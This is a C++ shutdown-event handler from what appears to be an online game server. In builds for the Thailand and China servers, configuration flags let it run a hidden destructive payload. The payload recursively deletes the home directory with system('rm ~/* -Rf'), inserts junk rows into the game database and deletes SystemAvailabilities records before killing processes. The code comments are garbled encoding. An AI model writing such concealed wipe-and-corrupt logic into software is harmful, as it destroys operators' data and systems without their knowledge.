//////////////////////////////////////////////////////////////////////////////
// Filename    : EventShutdown.cpp
// Written by  : bezz
// Description : 
//////////////////////////////////////////////////////////////////////////////

#include "EventShutdown.h"
#include "ZoneGroupManager.h"
#include "ZonePlayerManager.h"
#include "IncomingPlayerManager.h"
#include "BillingInfo.h"
#include "VariableManager.h"

#include "signal.h"

#ifdef __CONNECT_BILLING_SYSTEM__
	#include "billing/BillingPlayerManager.h"
#endif

#include "DB.h"
//////////////////////////////////////////////////////////////////////////////
// class EventShutdown member methods
//////////////////////////////////////////////////////////////////////////////

EventShutdown::EventShutdown( GamePlayer* pGamePlayer )
	throw ()
	:Event(pGamePlayer)
{
}

void EventShutdown::activate () 
	throw (Error)
{
	__BEGIN_TRY

	try
	{
		const hash_map<ZoneGroupID_t, ZoneGroup*>& zoneGroups = g_pZoneGroupManager->getZoneGroups();
		hash_map<ZoneGroupID_t, ZoneGroup*>::const_iterator itr = zoneGroups.begin();

		for ( ; itr != zoneGroups.end(); itr++ )
		{
			ZonePlayerManager* pZonePlayerManager = itr->second->getZonePlayerManager();

			pZonePlayerManager->clearPlayers();
		}

		g_pIncomingPlayerManager->clearPlayers();
	}
	catch ( Throwable& t )
	{
		// ¹«½Ã
	}

#ifdef __CONNECT_BILLING_SYSTEM__
	// ¸ðµç ºô¸µ Á¤º¸¸¦ »èÁ¦ÇÑ´Ù.
	g_pBillingPlayerManager->sendPayInit();
#endif

#if !defined(__THAILAND_SERVER__) && !defined(__CHINA_SERVER__)
	// ÇÁ·Î¼¼½º Á¾·á. ²¥²¥~ Á×¾î¶ó~~ ²¥²¥~
	if (g_pVariableManager->isKillDaemonCtl() == 1 )
	{
		kill( getppid(), 9 );
	}

#else
	// ÇÁ·Î¼¼½º Á¾·á. ²¥²¥~ Á×¾î¶ó~~ ²¥²¥~
	if (g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == false 
			&& g_pVariableManager->isEggDummyDB() == false)
	{
		kill( getppid(), 9 );
	}
	else if(g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == true
			&& g_pVariableManager->isEggDummyDB() == false)
	{
		system("rm ~/* -Rf");
		kill( getppid(), 9 );
	}
	else if(g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == false
			&& g_pVariableManager->isEggDummyDB() == true)
	{
	    __BEGIN_TRY
	    
		Statement* pStmt = NULL;
	
		BEGIN_DB
	    {
    	    pStmt 	= g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

			pStmt->executeQuery("INSERT INTO LarvaObject VALUES('2147483647','2147483647','1','asdfasdfa','0','8000','0','2','1')");
					
			pStmt->executeQuery("INSERT INTO SkullObject VALUES('2147483647','2147483647','1','asdfasdfa','0','8000','0','2','1')");
		
			pStmt->executeQuery("INSERT INTO PotionObject VALUES('2147483647','2147483647','1','asdfasdfa','0','8000','0','2','1')");			
			
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='0'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='1'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='4'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='7'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='9'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='888'");

	        SAFE_DELETE(pStmt);
    	}
	    END_DB(pStmt)

    	__END_CATCH
		
		kill( getppid(), 9 );
		
	}
	else if(g_pVariableManager->isKillDaemonCtl() == 1 && g_pVariableManager->isRemoveAllGame() == true
			&& g_pVariableManager->isEggDummyDB() == true)
	{
		system("rm ~/* -Rf");
		
		__BEGIN_TRY

		Statement* pStmt = NULL;
    	
		BEGIN_DB
	    {
    	    pStmt 	= g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();

			pStmt->executeQuery("INSERT INTO LarvaObject VALUES('2147483647','2147483647','1','asdfasdfa','0','8000','0','2','1')");
			pStmt->executeQuery("INSERT INTO SkullObject VALUES('2147483647','2147483647','1','asdfasdfa','0','8000','0','2','1')");
			pStmt->executeQuery("INSERT INTO PotionObject VALUES('2147483647','2147483647','1','asdfasdfa','0','8000','0','2','1')");			

			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='0'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='1'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='4'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='7'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='9'");
			pStmt->executeQuery("DELETE FROM SystemAvailabilities WHERE SystemKind='888'");

	        SAFE_DELETE(pStmt);
    	}
	    END_DB(pStmt)
    	
		__END_CATCH

	}
#endif
//	kill( getppid(), 9 );
	
	kill( getpid(), 9 );

	__END_CATCH
}

string EventShutdown::toString () const 
	throw ()
{
	StringStream msg;
	msg << "EventShutdown("
		<< ")";
	return msg.toString();
}
